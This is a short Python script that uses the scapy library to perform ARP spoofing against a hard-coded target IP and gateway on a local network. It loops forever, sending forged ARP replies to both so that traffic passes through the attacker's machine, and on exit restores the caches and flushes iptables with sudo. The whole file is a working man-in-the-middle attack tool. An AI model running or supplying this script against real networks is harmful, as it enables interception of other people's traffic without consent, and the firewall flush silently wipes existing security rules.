import scapy.all as scapy
import time
import sys
import subprocess
def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast,timeout =1,verbose=False)[0]
	if answered_list:
                return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):
	target_mac = get_mac(target_ip)
	packet =  scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
	scapy.send(packet,verbose=False)

def restore(dest_ip,src_ip):
	packet =  scapy.ARP(op=2,pdst=dest_ip,hwdst=get_mac(dest_ip),psrc=src_ip,hwsrc =get_mac(src_ip))
	scapy.send(packet,verbose=False,count=4)






target_ip = "192.168.225.202"
gate_way_ip= '192.168.225.1'

sent_packets_count = 0
try:
	while True:
			spoof(gate_way_ip,target_ip)

			spoof(target_ip,gate_way_ip)
			sent_packets_count+=2
			print("\r[+] sent packets : "+str(sent_packets_count),end="")

			sys.stdout.flush()
			time.sleep(2)
			

except KeyboardInterrupt:
	restore(gate_way_ip,target_ip)
	restore(target_ip,gate_way_ip)
	
	subprocess.call(['sudo', 'iptables', '--flush'])
	print("\n[+] Exiting....")
        
